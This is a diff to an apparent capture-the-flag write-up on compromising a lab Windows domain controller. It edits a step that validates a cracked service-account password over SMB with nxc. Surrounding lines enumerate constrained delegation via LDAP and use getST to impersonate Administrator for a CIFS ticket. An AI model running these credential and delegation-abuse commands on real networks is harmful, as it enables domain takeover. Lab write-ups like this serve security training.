@@ -464,13 +464,12 @@ SVC.SCANNER::CTF:48cef450ad43af44:4145aa880130d8e459a02cc61c8e3d16:0101000000000
 ...
 ```
 
-Validate the discovered credentials of `username=svc.scanner` and `password=1summerlove!` for `SMB` and check for remote management access via `winrm` as well.
+Validate the discovered credentials of `username=svc.scanner` and `password=1summerlove!` for server message block (`SMB`). Remote desktop protocol (`RDP`) and remote management access (`winrm`) can also be checked, but returns no positive results.
 
 ```bash
-root@ip-ATTACKER-IP:~# nxc smb winrm TARGET-IP -d ctf.local -u 'svc.scanner' -p '1summerlove!'
+root@ip-ATTACKER-IP:~# nxc smb TARGET-IP -d ctf.local -u 'svc.scanner' -p '1summerlove!'
 SMB         TARGET-IP   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
 SMB         TARGET-IP   445    DC01             [+] ctf.local\svc.scanner:1summerlove! 
-Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
 ```
 
 Enumerate the `LDAP` to discover delegation settings.
@@ -484,7 +483,7 @@ LDAP        TARGET-IP   389    DC01             ----------- ----------- --------
 LDAP        TARGET-IP   389    DC01             svc.scanner Person      Constrained w/ Protocol Transition cifs/DC01, cifs/DC01.ctf.local   
 ```
 
-`svc.scanner` can perform protocol transition while impersonating the `Administrator` to obtain a service ticket to `cifs` on the `DC01`, then export it.
+`svc.scanner` can perform protocol transition while impersonating the `Administrator` to obtain a service ticket to `CIFS` on the `DC01`, then export it.
 
 ```bash
 root@ip-ATTACKER-IP:~# getST -dc-ip TARGET-IP -spn cifs/DC01.ctf.local -impersonate Administrator 'ctf.local/svc.scanner:1summerlove!'
